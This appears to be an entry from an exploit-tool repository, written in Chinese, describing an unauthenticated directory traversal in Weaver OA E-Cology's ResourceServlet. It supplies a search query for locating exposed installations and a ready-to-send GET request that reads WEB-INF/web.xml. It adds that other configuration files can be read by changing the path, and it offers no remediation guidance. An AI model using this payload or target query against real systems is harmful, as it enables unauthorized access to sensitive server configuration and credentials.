---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微OA ResourceServlet 目录遍历漏洞

## 漏洞描述

泛微OA E-Cology 的 `/weaver/org.springframework.web.servlet.ResourceServlet` 接口中 `resource` 参数存在目录遍历漏洞，未对路径做有效限制。攻击者无需登录，通过指定 `resource` 参数即可读取服务器 `WEB-INF` 目录下的敏感文件（如 `web.xml`）。

## 漏洞影响

```
泛微OA E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

```
GET /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml HTTP/1.1
```

若响应返回 web.xml 文件内容，则漏洞存在。可替换路径读取其他 `WEB-INF` 目录下的配置文件。
